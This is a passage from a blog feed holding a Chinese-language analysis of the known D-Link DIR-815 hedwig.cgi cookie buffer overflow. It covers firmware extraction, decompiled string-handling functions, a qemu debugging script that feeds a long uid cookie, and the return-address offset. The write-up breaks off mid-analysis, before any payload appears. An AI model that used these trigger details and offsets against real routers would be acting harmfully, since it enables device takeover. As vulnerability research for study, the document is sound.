href="http://roberto.greyhats.it/advisories/20130801-dlink-dir645.txt">roberto.greyhats.it/advisories/20130801-dlink-dir645.txt</a></p>]]></content>
    
    
    <summary type="html">D-Link Dir-645 路由器溢出漏洞分析</summary>
    
    
    
    <category term="CVE" scheme="http://lantern.cool/categories/CVE/"/>
    
    
    <category term="CVE" scheme="http://lantern.cool/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>D-Link DIR-815 路由器多次溢出漏洞分析</title>
    <link href="http://lantern.cool/CVE-d-link-dir-815/"/>
    <id>http://lantern.cool/CVE-d-link-dir-815/</id>
    <published>2021-10-28T17:44:35.000Z</published>
    <updated>2021-10-28T17:44:37.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="D-Link-DIR-815-路由器多次溢出漏洞分析"><a href="#D-Link-DIR-815-路由器多次溢出漏洞分析" class="headerlink" title="D-Link DIR-815 路由器多次溢出漏洞分析"></a>D-Link DIR-815 路由器多次溢出漏洞分析</h2><ul><li><a href="https://www.exploit-db.com/exploits/33863">D-Link Devices - ‘hedwig.cgi’ Remote Buffer Overflow in Cookie Header (Metasploit) - Hardware remote Exploit (exploit-db.com)</a></li></ul><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://c0ug4r.top/posts/book_notes_router_0day/">《揭秘家用路由器0day漏洞挖掘技术》漏洞分析笔记（一） :: Cougar — Blog (c0ug4r.top)</a></p><p><a href="https://kirin-say.top/2019/02/23/Building-MIPS-Environment-for-Router-PWN/">Building MIPS Environment for Router &amp;&amp; PWN (kirin-say.top)</a></p><h3 id="固件提取"><a href="#固件提取" class="headerlink" title="固件提取"></a>固件提取</h3><ol><li><p>固件下载</p><ul><li><p>Google 搜索 DIR-815_FIRMWARE_1.01.ZIP</p><ul><li><a href="https://rebyte.me/en/d-link/89510/file-592084/">File DIR-815_FIRMWARE_1.01.ZIP — Firmware for D-link DIR-815 (rebyte.me)</a></li></ul></li><li><p>官方链接下载<code>ftp://ftp2.dlink.com/PRODUCTS/DIR-815/REVA/DIR-815_FIRMWARE_1.01.zip</code></p></li></ul></li><li><p>解压缩得到固件<code>DIR-815 FW 1.01b14_1.01b14.bin</code></p></li><li><p><code>binwalk -e DIR-815 FW 1.01b14_1.01b14.bin</code></p><ul><li><p>报错：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">WARNING: Extractor.execute failed to run external extractor &#x27;sasquatch -p 1 -be -d &#x27;%%squashfs-root%%&#x27; &#x27;%e&#x27;&#x27;: [Errno 2] No such file or directory: &#x27;sasquatch&#x27;: &#x27;sasquatch&#x27;</span><br></pre></td></tr></table></figure></li><li><p>解决：</p><ul><li><p>参考：<a href="https://blog.csdn.net/AS7062031/article/details/108036554"> binwalk 安装 与使用 xz_wrapper.h:50:2: error: unknown type name ‘lzma_vli’_AS7062031的博客-CSDN博客</a></p></li><li><p>```<br># Install sasquatch to extract non-standard SquashFS images<br>$ sudo apt-get install zlib1g-dev liblzma-dev liblzo2-dev<br>$ git clone <a href="https://github.com/devttys0/sasquatch">https://github.com/devttys0/sasquatch</a><br>$ (cd sasquatch &amp;&amp; ./build.sh)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">     - 安装报错`xz_wrapper.h:50:2: error: unknown type name ‘lzma_vli’`</span><br><span class="line"></span><br><span class="line">     - `cd squashfs-tools`，编辑`Makefile`以注释掉`XZ_SUPPORT = 1`行</span><br><span class="line"></span><br><span class="line">       ![image-20211026143705009](https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211026143705009.png)</span><br><span class="line"></span><br><span class="line">       然后尝试构建：注意此时不要直接`./build.sh`, 在`squashfs-tools`下`sudo make &amp;&amp; make install`</span><br><span class="line"></span><br><span class="line">   - 执行`binwalk -e DIR-815 FW 1.01b14_1.01b14.bin` 得到</span><br><span class="line"></span><br><span class="line">     ![image-20211026142843634](https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211026142843634.png)</span><br><span class="line"></span><br><span class="line">4. 该漏洞的核心组件为`/htdocs/web/hedwig.cgi`， 可以看到该组件是一个指向`/htdocs/cgibin`的符号链接</span><br><span class="line"></span><br><span class="line">   ![image-20211026143220423](https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211026143220423.png)</span><br><span class="line"></span><br><span class="line">### 漏洞分析</span><br><span class="line"></span><br><span class="line">![image-20211026143958015](https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211026143958015.png)</span><br><span class="line"></span><br><span class="line">根据漏洞公告可知漏洞产生原因是Cookie的值超长，通过`char *getenv(&quot;HTTP_COOKIE&quot;)`函数可以在CGI脚本中获取用户输入的Cookie值，因此将`cgibin`放入IDA中，在IDA中搜索`HTTP_Cookie`即可</span><br><span class="line"></span><br><span class="line">![image-20211026144215967](https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211026144215967.png)</span><br><span class="line"></span><br><span class="line">根据交叉引用找到`sess_get_uid`函数</span><br><span class="line"></span><br><span class="line">![image-20211026144431917](https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211026144431917.png)</span><br><span class="line"></span><br><span class="line">查看伪代码，确实通过`char *getenv(&quot;HTTP_COOKIE&quot;)`函数获得Cookie</span><br><span class="line"></span><br><span class="line">![image-20211026144623750](https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211026144623750.png)</span><br><span class="line"></span><br><span class="line">继续查找交叉引用</span><br><span class="line"></span><br><span class="line">![image-20211026144714231](https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211026144714231.png)</span><br><span class="line"></span><br><span class="line">在`hedwigcgi_main + 1C8`处的下方，存在危险函数`sprintf`</span><br><span class="line"></span><br><span class="line">![image-20211026144820180](https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211026144820180.png)</span><br><span class="line"></span><br><span class="line">![image-20211026144923695](https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211026144923695.png)</span><br><span class="line"></span><br><span class="line">初步分析该函数造成缓冲区溢出漏洞，为了验证是否是`0x409680`处的地址造成该溢出漏洞，采用动态调试进行验证</span><br><span class="line"></span><br><span class="line">在`sess_get_uid()`函数过程分析中发现多数sobj开头的函数，根据分析得到如下结构</span><br><span class="line"></span><br><span class="line">```assembly</span><br><span class="line">00000000 sobj            struc  # (sizeof=0x18, mappedto_7)</span><br><span class="line">00000000 field_0:        .word ?                  # offset</span><br><span class="line">00000004 field_4:        .word ?                  # offset</span><br><span class="line">00000008 field_8:        .word ?</span><br><span class="line">0000000C max_size:       .word ?</span><br><span class="line">00000010 used_size:      .word ?</span><br><span class="line">00000014 string:         .word ?                  # offset</span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ol><p><strong>sobj_new() 申请一个新的字符串结构</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">sobj *<span class="title">sobj_new</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  sobj *result; <span class="comment">// $v0</span></span><br><span class="line"></span><br><span class="line">  result = (sobj *)<span class="built_in">malloc</span>(<span class="number">0x18</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    result-&gt;field_8 = <span class="number">0</span>;<span class="comment">// 未知, 但根据free可知应该与该结构的字符串有关</span></span><br><span class="line">    result-&gt;max_size = <span class="number">0</span>;                       <span class="comment">// 该结构的字符串最大长度</span></span><br><span class="line">    result-&gt;used_size = <span class="number">0</span>;                      <span class="comment">// 该结构已使用的字节数(不包括&#x27;\0&#x27;)</span></span><br><span class="line">    result-&gt;<span class="built_in">string</span> = <span class="number">0</span>;                         <span class="comment">// 放该结构的字符串堆块的地址</span></span><br><span class="line">    result-&gt;field_4 = result;                   <span class="comment">// 放该结构的首地址</span></span><br><span class="line">    result-&gt;field_0 = result;                   <span class="comment">// 放该结构的首地址</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>sobj_free() 将该字符串结构中的字符串删除</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">sobj_free</span><span class="params">(sobj *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// $v0</span></span><br><span class="line">  <span class="keyword">char</span> *<span class="built_in">string</span>; <span class="comment">// $a0</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">string</span> = a1-&gt;<span class="built_in">string</span>;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">string</span> )</span><br><span class="line">      <span class="built_in">free</span>(<span class="built_in">string</span>);</span><br><span class="line">    a1-&gt;field_8 = <span class="number">0</span>;</span><br><span class="line">    a1-&gt;<span class="built_in">string</span> = <span class="number">0</span>;</span><br><span class="line">    a1-&gt;max_size = <span class="number">0</span>;</span><br><span class="line">    a1-&gt;used_size = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>sobj_add_char 向该字符串结构追加一个新字符</strong> </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">sobj_add_char</span><span class="params">(sobj *a1, <span class="keyword">char</span> ch)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> used_size; <span class="comment">// $v1</span></span><br><span class="line">  <span class="keyword">char</span> *<span class="built_in">string</span>; <span class="comment">// $v0</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !a1 || a1-&gt;max_size == a1-&gt;used_size &amp;&amp; sobj_resize(a1) &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  used_size = a1-&gt;used_size;</span><br><span class="line">  a1-&gt;<span class="built_in">string</span>[used_size] = ch;</span><br><span class="line">  <span class="built_in">string</span> = a1-&gt;<span class="built_in">string</span>;</span><br><span class="line">  a1-&gt;used_size = used_size + <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">string</span>[used_size + <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>sobj_resize 该函数地址在0x0040E864, 分析可知该函数功能：</strong></p><ol><li><strong>如果已申请字符串空间则增加33字节的空间</strong> </li><li><strong>如果未申请字符串空间则申请一个33字节的空间</strong></li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">sobj_resize</span><span class="params">(sobj *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *<span class="built_in">string</span>; <span class="comment">// $a0</span></span><br><span class="line">  <span class="keyword">int</span> max_size; <span class="comment">// $a1</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// $v1</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !a1 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="built_in">string</span> = a1-&gt;<span class="built_in">string</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">string</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    max_size = a1-&gt;max_size;</span><br><span class="line">    a1-&gt;max_size = max_size + <span class="number">32</span>;</span><br><span class="line">    a1-&gt;<span class="built_in">string</span> = (<span class="keyword">char</span> *)<span class="built_in">realloc</span>(<span class="built_in">string</span>, max_size + <span class="number">33</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    a1-&gt;max_size = <span class="number">32</span>;</span><br><span class="line">    a1-&gt;<span class="built_in">string</span> = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x21</span>u);</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !a1-&gt;<span class="built_in">string</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">return</span> v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>sobj_strcmp 将字符串结构中的字符串与给定字符串进行对比, 如果当前字符串结构的字符串空间未申请，则拿空字符与给定字符串对比</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">sobj_strcmp</span><span class="params">(sobj *a1, <span class="keyword">const</span> <span class="keyword">char</span> *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *<span class="built_in">string</span>; <span class="comment">// $a0</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !a1 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="built_in">string</span> = a1-&gt;<span class="built_in">string</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">string</span> )</span><br><span class="line">    <span class="built_in">string</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strcmp</span>(<span class="built_in">string</span>, a2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>sobj_get_string 获得字符串结构中的字符串</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char *__fastcall sobj_get_string(sobj *a1)</span><br><span class="line">&#123;</span><br><span class="line">  char *string; // $v1</span><br><span class="line"></span><br><span class="line">  string = 0;</span><br><span class="line">  if ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    string = a1-&gt;string;</span><br><span class="line">    if ( !string )</span><br><span class="line">      return &quot;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  return string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>sobj_add_string 向字符串结构追加新的字符串</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">sobj_add_string</span><span class="params">(sobj *a1, <span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// $v1</span></span><br><span class="line">  <span class="keyword">size_t</span> str_len; <span class="comment">// $s1</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// $v0</span></span><br><span class="line">  <span class="keyword">int</span> used_size; <span class="comment">// $v1</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !a1 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( str )</span><br><span class="line">  &#123;</span><br><span class="line">    str_len = <span class="built_in">strlen</span>(str);</span><br><span class="line">    <span class="keyword">if</span> ( str_len )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        used_size = a1-&gt;used_size;</span><br><span class="line">        <span class="keyword">if</span> ( a1-&gt;max_size - used_size &gt;= str_len )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        v6 = sobj_resize(a1);</span><br><span class="line">        v4 = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v6 &lt; <span class="number">0</span> )</span><br><span class="line">          <span class="keyword">return</span> v4;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">strcpy</span>(&amp;a1-&gt;<span class="built_in">string</span>[used_size], str);</span><br><span class="line">      v4 = <span class="number">0</span>;</span><br><span class="line">      a1-&gt;used_size += str_len;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>sobj_del 删除字符串结构</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">sobj_del</span><span class="params">(sobj *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *<span class="built_in">string</span>; <span class="comment">// $a0</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">string</span> = a1-&gt;<span class="built_in">string</span>;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">string</span> )</span><br><span class="line">      <span class="built_in">free</span>(<span class="built_in">string</span>);</span><br><span class="line">    <span class="built_in">free</span>(a1);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>sess_get_uid()</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">sess_get_uid</span><span class="params">(sobj *cookie)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  sobj *key_sobj; <span class="comment">// $s2</span></span><br><span class="line">  <span class="keyword">char</span> *v3; <span class="comment">// $v0</span></span><br><span class="line">  sobj *value_sobj; <span class="comment">// $s3</span></span><br><span class="line">  <span class="keyword">char</span> *http_cookie; <span class="comment">// $s4</span></span><br><span class="line">  <span class="keyword">int</span> status; <span class="comment">// $s1</span></span><br><span class="line">  <span class="keyword">int</span> current_char; <span class="comment">// $s0</span></span><br><span class="line">  <span class="keyword">char</span> *<span class="built_in">string</span>; <span class="comment">// $v0</span></span><br><span class="line"></span><br><span class="line">  key_sobj = sobj_new();</span><br><span class="line">  value_sobj = sobj_new();</span><br><span class="line">  v3 = getenv(<span class="string">&quot;HTTP_COOKIE&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !key_sobj )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">  <span class="keyword">if</span> ( !value_sobj )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">  http_cookie = v3;</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">  status = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    current_char = *http_cookie;</span><br><span class="line">    <span class="keyword">if</span> ( !*http_cookie )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( status == <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">    <span class="keyword">if</span> ( status &lt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( current_char == <span class="string">&#x27; &#x27;</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">      sobj_free(key_sobj);</span><br><span class="line">      sobj_free(value_sobj);</span><br><span class="line">LABEL_11:</span><br><span class="line">      <span class="keyword">if</span> ( current_char == <span class="string">&#x27;;&#x27;</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        status = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        status = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> ( current_char != <span class="string">&#x27;=&#x27;</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          sobj_add_char(key_sobj, current_char);</span><br><span class="line">          status = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( status == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( current_char == <span class="string">&#x27;;&#x27;</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        status = <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">      &#125;</span><br><span class="line">      sobj_add_char(value_sobj, *http_cookie++);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      status = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !sobj_strcmp(key_sobj, <span class="string">&quot;uid&quot;</span>) )      <span class="comment">// 找到uid键值对</span></span><br><span class="line">        <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">LABEL_18:</span><br><span class="line">      ++http_cookie;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !sobj_strcmp(key_sobj, <span class="string">&quot;uid&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_21:</span><br><span class="line">    <span class="built_in">string</span> = sobj_get_string(value_sobj);       <span class="comment">// 将cookie中uid键值对中的value提取到string中</span></span><br><span class="line">    <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_27:</span><br><span class="line">  <span class="built_in">string</span> = getenv(<span class="string">&quot;REMOTE_ADDR&quot;</span>);</span><br><span class="line">LABEL_22:</span><br><span class="line">  sobj_add_string(cookie, <span class="built_in">string</span>);              <span class="comment">// 将string追加到cookie中</span></span><br><span class="line">  <span class="keyword">if</span> ( key_sobj )</span><br><span class="line">    sobj_del(key_sobj);</span><br><span class="line">  <span class="keyword">if</span> ( value_sobj )</span><br><span class="line">    sobj_del(value_sobj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>综上，Cookie的形式为<code>uid=payload</code>才会被程序接受</p><p>分析上层函数<code>hedwigcgi_main()</code>, 请求方式只支持POST</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211026162012256.png" alt="image-20211026162012256"></p><h3 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h3><p>根据上述漏洞分析，我们首先需要确定偏移量</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  squashfs-root python3 patternLocOffset.py -c -l 2000 -f test</span><br><span class="line">[*] Create pattern string contains 2000 characters ok!</span><br><span class="line">[+] output to test ok!</span><br><span class="line">[+] take time: 0.0016 s</span><br></pre></td></tr></table></figure><p>程序通过getenv的方式获取HTTP数据包中的数据，流程应该为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">主Web程序监听端口-&gt;传送HTTP数据包-&gt;</span><br><span class="line">HTTP中headers等数据通过环境变量的方式传给cgi处理程序-&gt;</span><br><span class="line">cgi程序通过getenv获取数据并处理返回给主程序-&gt;向客户端返回响应数据</span><br><span class="line">#POST具体数据可以通过类似输入流传入 ：echo &quot;uid=aaa&quot;| /htdocs/web/hedwig.cgi</span><br></pre></td></tr></table></figure><p><strong>因此，动态调试时只需要使用qemu -E设置环境变量或者在mips系统中export设置环境变量并允许程序即可模拟Web场景</strong></p><p><strong>动调测试脚本 test.sh</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">test</span>=$(python -c <span class="string">&quot;print &#x27;uid=&#x27;+open(&#x27;test&#x27;,&#x27;r&#x27;).read(2000)&quot;</span>)</span><br><span class="line">LEN=$(<span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$test</span>&quot;</span> | wc -c)</span><br><span class="line">PORT=<span class="string">&quot;23946&quot;</span></span><br><span class="line">cp $(<span class="built_in">which</span> qemu-mipsel-static) ./qemu</span><br><span class="line">sudo chroot . ./qemu -E CONTENT_LENGTH=<span class="variable">$LEN</span> -E CONTENT_TYPE=<span class="string">&quot;application/x-www-form-urlencoded&quot;</span> -E REQUEST_METHOD=<span class="string">&quot;POST&quot;</span> -E HTTP_COOKIE=<span class="variable">$test</span> -E REQUEST_URL=<span class="string">&quot;/hedwig.cgi&quot;</span> -E REMOTE_ADDR=<span class="string">&quot;127.0.0.1&quot;</span> -g <span class="variable">$PORT</span> /htdocs/web/hedwig.cgi 2&gt;/dev/null</span><br><span class="line">rm -f ./qemu</span><br></pre></td></tr></table></figure><p>在<code>squashfs-root</code>目录下执行<code>./test.sh</code></p><p>在<code>.text:00409A28 lw $ra, 0x4E8+var_4($sp)</code>指令执行完后：</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211026163037652.png" alt="image-20211026163037652"></p><p>计算偏移</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  squashfs-root python3 patternLocOffset.py -s 0x38694237 -l 2000</span><br><span class="line">[*] Create pattern string contains 2000 characters ok!</span><br><span class="line">[*] No exact matches, looking for likely candidates...</span><br><span class="line">[+] Possible match at offset 1043 (adjusted another-endian)</span><br><span class="line">[+] take time: 0.0004 s</span><br></pre></td></tr></table></figure><p>然而在这个漏洞点后还有一个<code>sprintf</code></p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211026165144077.png" alt="image-20211026165144077"></p><p>这里同样是取uid的值进行格式化输出，且<strong>如果执行成功会覆盖前面的结果，则偏移会发生变化</strong>。那么我们就需要查看如何触发到该漏洞点</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211026165412993.png" alt="image-20211026165412993"></p><p>如果<code>fopen(&quot;/var/tmp/temp.xml&quot;, &quot;w&quot;)</code>打开成功则会执行到第二个<code>sprintf</code>，因为没有实机没法判断实际固件中是否有这个目录</p><blockquote><p>根据书中的描述，可以通过给路由器发包查看返回结果来确认是否存在该文件，而根据书中的测试，实际路由器中是存在有这个目录文件的</p></blockquote><p>因此我们手动创建该目录及文件</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  squashfs-root mkdir var/tmp</span><br><span class="line">➜  squashfs-root touch var/tmp/temp.xml</span><br><span class="line">➜  squashfs-root ls var/tmp</span><br><span class="line">temp.xml</span><br></pre></td></tr></table></figure><p>继续测试发现如果下方haystack为0，无法走到第二个漏掉点</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211026170042613.png" alt="image-20211026170042613"></p><p>查找交叉引用，haystack是下方这个函数进行赋值的</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *__fastcall <span class="title">sub_409A6C</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *result; <span class="comment">// $v0</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( haystack )</span><br><span class="line">    <span class="built_in">free</span>(haystack);</span><br><span class="line">  result = sobj_strdup(*(sobj **)(a2 + <span class="number">4</span>));</span><br><span class="line">  haystack = result;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而该函数在此处进行调用</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211026170218998.png" alt="image-20211026170218998"></p><p>进入该函数，此处根据我们传入的<code>CONTENT_TYPE</code>进行函数的调用</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211026172555088.png" alt="image-20211026172555088"></p><p><strong>types_funcs：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211026172614546.png" alt="image-20211026172614546"></p><p><strong>node结构</strong>如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000 node            struc  # (sizeof=0xC, mappedto_8)</span><br><span class="line">00000000                                          # XREF: .data.rel.ro:types_funcs/r</span><br><span class="line">00000000 string_name:    .word ?                  # offset</span><br><span class="line">00000004 string_len:     .word ?</span><br><span class="line">00000008 func:           .word ?                  # offset</span><br><span class="line">0000000C node            ends</span><br><span class="line">0000000C</span><br></pre></td></tr></table></figure><p>分析我们传入的参数，可知调用为<code>sub_403B10</code>函数</p><p>进入<code>sub_403B10</code>函数继续调试， 跟进<code>sub_402B40</code></p><ul><li> 这里需要说明一下v16，应该是一个结构体，包含了我们传进来的函数指针</li><li>而且<code>sub_402B40</code>传入的也是v16的地址，及该结构体的指针</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211026185213761.png" alt="image-20211026185213761"></p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211026185039375.png" alt="image-20211026185039375"></p><p>进入<code>sub_402B40</code>函数，只要<code>a1 + 4</code>不为空即可调用<code>sub_409A6C</code>对<code>haystack</code>进行赋值</p><p><img 